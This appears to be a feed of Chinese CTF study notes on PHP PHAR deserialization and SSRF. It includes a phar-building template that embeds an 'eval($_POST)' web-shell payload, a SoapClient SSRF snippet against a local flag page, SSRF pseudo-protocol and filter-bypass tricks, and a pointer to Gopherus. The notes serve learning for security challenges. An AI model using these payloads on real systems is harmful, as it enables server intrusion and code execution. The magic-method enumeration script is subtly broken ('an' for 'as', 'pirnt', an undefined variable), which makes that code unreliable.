item.title: Php_unserialized
item.description:
<h2 id="php反序列化" class="heading-element"><span>PHP反序列化</span>
 <a href="#php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="phar" class="heading-element"><span>PHAR</span>
 <a href="#phar" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><p>1.一系列小的压缩文件</p>
<p>2.phar是类似zip一样的压缩包文件(把php文件压缩成<strong>压缩包</strong>)</p>
<p>3.phar会将文件进行序列化并且存储下来 在用phar://伪协议读取的时候会自动反序列化</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;phar:///file/to/your/path/file.php&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h3 id="phar文件生成的模板" class="heading-element"><span>phar文件生成的模板</span>
 <a href="#phar%e6%96%87%e4%bb%b6%e7%94%9f%e6%88%90%e7%9a%84%e6%a8%a1%e6%9d%bf" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Testobj</span>{
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">var</span> $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>(<span style="color:#e6db74">&#34;test.phar&#34;</span>); <span style="color:#75715e">//删除之前可能生成的phar文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#34;test.phar&#34;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#34;&lt;?php __HALT_COMPILER();?&gt;&#34;</span>);
</span></span><span style="display:flex;"><span>$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Testobj</span>();
</span></span><span style="display:flex;"><span>$o<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eval(</span><span style="color:#e6db74">$_POST[&#39;a&#39;]</span><span style="color:#e6db74">);&#34;</span>;
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setMetadata</span>($o);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#34;test.txt&#34;</span>, <span style="color:#e6db74">&#34;test&#34;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h2 id="php原生类利用如soapclient-ps需要开启相关配置-extensionphp_soapdll" class="heading-element"><span>PHP原生类利用(如SoapClient PS:需要开启相关配置 extension=php_soap.dll)</span>
 <a href="#php%e5%8e%9f%e7%94%9f%e7%b1%bb%e5%88%a9%e7%94%a8%e5%a6%82soapclient-ps%e9%9c%80%e8%a6%81%e5%bc%80%e5%90%af%e7%9b%b8%e5%85%b3%e9%85%8d%e7%bd%ae-extensionphp_soapdll" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ol>
<li>当源码中并没有类对象 也没有出现方法 即考虑<strong>原生类</strong></li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1/flag.php&#34;</span>;
</span></span><span style="display:flex;"><span>$post_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;token = ctfshow&#34;</span>;
</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SoapClient</span>(<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;location&#39;</span> <span style="color:#f92672">=&gt;</span> $target ,<span style="color:#e6db74">&#39;user_agent&#39;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#39;X-Forwarded-For:127.0.0.1&#39;</span>));
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h2 id="其他原生类" class="heading-element"><span>其他原生类</span>
 <a href="#%e5%85%b6%e4%bb%96%e5%8e%9f%e7%94%9f%e7%b1%bb" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$classes <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_declared_classes</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($classes <span style="color:#a6e22e">an</span> $method){
</span></span><span style="display:flex;"><span> $methods <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_class_methods</span>($class);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">foreach</span> ($methods <span style="color:#66d9ef">as</span> $method){
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($method,<span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__destruct&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__tostring&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__wakeup&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__call&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__callStatic&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__get&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__set&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__isset&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__unset&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__invoke&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;__set_state&#39;</span>
</span></span><span style="display:flex;"><span>))){
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">pirnt</span> $class <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;::&#39;</span> <span style="color:#f92672">.</span> $method <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div>

item.title: SSRF
item.description:
<h2 id="ssrf-服务端请求伪造漏洞" class="heading-element"><span>SSRF 服务端请求伪造漏洞</span>
 <a href="#ssrf-%e6%9c%8d%e5%8a%a1%e7%ab%af%e8%af%b7%e6%b1%82%e4%bc%aa%e9%80%a0%e6%bc%8f%e6%b4%9e" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><blockquote>
<p>攻击某个服务器外网无法访问的内部的系统</p>
</blockquote>
<p><strong>黑盒探针</strong></p>
<p>1、社交功能分享</p>
<p>2、转码服务</p>
<p>3、在线翻译</p>
<p>4、图片加载/下载</p>
<p>5、图片/文章收藏功能</p>
<p>6、云服务厂商</p>
<p>7、网站采集</p>
<p>8、数据库内置功能</p>
<p>9、邮件系统</p>
<p>10、编码处理，属性信息处理，文件处理</p>
<p>11、未公开的api实及其他扩展调用url的功能</p>
<p><strong>SSRF伪协议利用</strong></p>
<blockquote>
<p>http://</p>
<p>file://</p>
<p>dict://</p>
<p>sftp://</p>
<p>ldap://</p>
<p>tftp://</p>
<p>gopher:// 分布式文档传递服务 可使用gopherus生成payload</p>
</blockquote>
<p><strong>内网访问过滤绕过</strong></p>
<p>1、短网址</p>
<p>2、域名解析</p>
<p>3、进制转换(127.0.0.1=&gt;0x7f.0.0.1)</p>
<p>4、长度限制绕过（url=http://0/flag.php）</p>
<p>5、重定向绕过解析 ：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location:http://127.0.0.1/flag.php&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>6、访问本地的方法(url = http://ctf.@127.0.0.1/flag.php#show)</p>
<p>7、gopher伪协议主要是在需要利用服务器内部某些服务的时候有的漏洞，比如说有mysql:3306 漏洞利用工具https://github.com/tarunkant/Gopherus</p>
<p><strong>SSRF无回显</strong></p>
